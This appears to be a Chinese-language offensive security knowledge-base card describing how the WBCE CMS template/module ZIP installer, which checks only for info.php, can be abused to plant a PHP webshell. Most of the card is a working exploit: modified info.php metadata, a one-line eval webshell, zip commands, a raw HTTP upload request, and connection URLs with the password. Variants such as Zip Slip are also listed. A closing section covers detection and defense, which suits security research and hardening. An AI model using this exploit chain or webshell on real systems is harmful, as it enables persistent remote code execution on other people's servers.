---
id: web-generic-file-upload-cms-addon-info-php-zip-installer-rce
title: CMS 后台 Templates/Modules ZIP 安装只校验包内 info.php 存在：改 info.php 元数据后整包解压落 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: addon-zip-info-php-marker-bypass
tags:
- web
- php
- file-upload
- zip
- cms
- addon
- webshell
- info-php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: WBCE CMS 1.5.2（原文验证版本）
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:32:54+08:00'
  notes: 已对照本篇原文核对：Templates/Modules 安装只校验 info.php 存在 + is_dir/versionCompare 去重（Already installed 分支）、改 $template_directory/$module_directory 与版本号后整包解压到 templates|modules/、muma.php 冰蝎连接成功，与原文截图一致；两层打包细节与原文一致。未验证点：Zip Slip/子目录 .htaccess 解析为变体设想，原文未验证。
url: /docs/web/generic/file-upload/web-generic-file-upload-cms-addon-info-php-zip-installer-rce/
draft: false
kb_aliases:
- 主题/模块安装 info.php 校验绕过
- WBCE Templates Modules 上传 WebShell
- add-on zip 安装器落地 shell
- info.php 元数据魔改
---

## 一句话结论

CMS 的「安装模板 / 安装模块」功能接受 ZIP 包，服务端只做两件事：包内必须存在 `info.php`、且 `info.php` 里的 `template_directory` / `module_directory` 与已安装目录比对去重；校验通过就整包解压到 Web 可访问的 `templates/`、`modules/` 目录——这意味着攻击者复制一份官方模板/模块，改掉 `info.php` 里的目录名与版本号（避免「已安装」拦截），再往里塞一个 PHP 木马，打包上传即得到一个可直接连接的 WebShell。

## 原理

- 安装器逻辑（以 WBCE 为例）：解压到临时目录 → `if (!list && file_exists($temp_unzip.'info.php'))` 校验失败则报 `GENERIC_INVALID_ADDON_FILE`（提示 `Please check the *.zip format.`）→ `require` 该 `info.php` 读出 `$template_directory`/`$template_version`（或 `$module_directory`/`$module_version`）。
- 后续判断是「目录是否已存在 + 版本比较」：若 `is_dir(WB_PATH.'/templates/'.$template_directory)` 为真且包内 `info.php` 的版本号不大于已安装版本，则报 `Already installed`；否则继续解压到目标目录。
- 因此**绕过点不在文件内容检查（根本不存在）而在「去重/版本比较」**：把 `$template_directory` 改成新名字（如 `muma`）、版本号改大（或干脆改小绕过 `versionCompare >=`），就不会命中「已安装」，整包被解压。
- 木马之所以能落地：ZIP 内除 `info.php`、`index.php` 等 CMS 期望的文件外，可以任意增删条目（无扩展名白名单、无内容扫描），PHP 文件被解压到 `templates/<目录>/`、`modules/<目录>/` 后由 Web 直接解析。
- 打包细节：`ZipArchive::extractTo` 对条目路径按「顶级目录」还原，所以必须保持官方包结构（`<目录名>/info.php`），且原文提示「因为解压的原因，需要打两层的包」——即外层 zip 里再套一层同结构目录，避免解压后路径层级不符导致安装器找不到 `info.php` 或文件落错位置。
- 与语言包路径的差别：语言包是「`require` 上传临时文件」的即时执行；模块/模板安装是「整包解压后按目录/文件名访问」的持久化落地，后者不依赖报错时机，稳定性更高。

## 触发条件

- 目标 CMS 后台提供 Templates/Modules 的 ZIP 安装入口，且攻击者持有管理员会话。
- 安装器只校验 `info.php` 是否存在与目录/版本去重，未校验 ZIP 内其它条目类型与内容。
- `templates/`、`modules/` 等目录可写，且位于 Web 根下可被 PHP 解析。
- 攻击者能构造符合官方结构的 ZIP（可直接下载官方模板作为模板包）。

## 利用步骤

1. 从官方发行包或线上已安装模板目录里下载/复制一份合法模板（如 `wbce_flat_theme`），得到含 `info.php`、`index.php` 的完整目录。
2. 修改该目录下的 `info.php`：`$template_directory = 'muma';`、`$template_name = 'muma';`，并把 `$template_version` 改成比线上版本低（若安装器用 `>=` 判已安装，则低版本能绕过；或改高版本走 upgrade 分支）。
3. 在同目录放入木马 `muma.php`（`<?php @eval($_POST['pass']); ?>`）。
4. 按官方结构重新打包：`zip -r muma.zip muma/`；若安装器对层级敏感，再套一层外层 zip。
5. 后台 → Add-ons → Templates → Install Template，上传该 zip，返回 `Installed successfully`。
6. 访问 `http://target/templates/muma/muma.php`，用 Webshell 工具连接（密码 `pass`）。
7. Modules 路径同理：复制一个官方 module（其 `info.php` 用 `$module_directory`/`$module_name`），改目录名与版本，放木马，上传后在 `modules/<目录>/` 下访问。

## PoC

`info.php`（模板版，节选）：

```php
<?php
$template_directory = 'muma';
$template_name = 'muma';
$template_version = '1.0.1';
$template_platform = '1.4';
$template_author = 'x';
$template_license = 'MIT';
$template_description = 'x';
?>
```

木马 `muma.php`：

```php
<?php @eval($_POST['pass']); ?>
```

打包与上传：

```
zip -r muma.zip muma/
# 若安装器校验层级，再打一层
zip -r muma_outer.zip muma.zip
```

```http
POST /wbce/admin/templates/install.php HTTP/1.1
Host: target
Cookie: <后台会话>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="muma_outer.zip"
Content-Type: application/zip

<zip 内容>
------X--
```

连接：

```
http://target/templates/muma/muma.php   密码 pass
http://target/modules/muma/muma.php     密码 pass（模块版）
```

## 变体与关联

- 变体：模块版 `info.php` 用 `$module_directory`/`$module_name`/`$module_function`/`$module_version` 等字段，与模板版字段名不同，需按页面提示实际取字段（原文模块版 `$module_directory='muma'; $module_name='muma'; $module_version='5.0.11';`）。
- 变体：不改官方模板、直接把木马改名为官方期望的文件（如覆盖 `index.php`），可绕过「目录名去重」但会破坏模板展示，适合快速验证。
- 变体：把木马放进 `css/`、`js/` 等子目录并配合 `.htaccess` 解析，或在 ZIP 条目名里做路径穿越（Zip Slip）落到更深位置。
- 变体：版本比较用 `versionCompare($old,$new,'>=')` 时，把新版本设为很低即可跳过「已安装」拦截；反之若走 upgrade 分支，需要保证 `unlink` 后重新解压。
- 关联：[[web-php-rce-wbce-install-language-file-getcontents-rce]]（同一 CMS 的语言包 `require` 即时执行路径，本卡是 ZIP 解压的持久化路径）。
- 关联：[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（EMLOG 只校验 `header.php` 存在的同构校验缺陷）。
- 关联：[[web-generic-file-upload-pluck-cve-2022-26965-theme-zip-info-php-rce]]（pluck 主题 `info.php` 被 include 的对照案例）。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（若解压目标目录可控，可叠加 Zip Slip 写到任意位置）。

## 检测与防御

- 防御：安装包解压前做完整白名单校验：条目名（禁止 `..`、绝对路径、软链接）、条目类型（只允许 `.php/.css/.js/.png` 等声明类型且内容符合）、`info.php` 只允许出现固定变量赋值（用静态解析而非 `require`）。
- 防御：解压到隔离目录后再逐文件搬移；`templates/`、`modules/` 目录下禁止出现未在官方清单内的 PHP 文件；安装后计算文件清单哈希。
- 防御：安装器要求包签名（官方私钥签名），后台功能加操作审批与审计。
- 检测：监控 `templates/`、`modules/`、`languages/` 下的新文件写入与首次被请求；`GET /templates/<新增目录>/*.php` 的访问在安装后立即出现即高危。
- 检测：审计「`file_exists($temp.'/info.php')` 之后直接 `extractTo`」的安装器代码模式，凡「只校验标记文件存在即解压」都属同类缺陷。
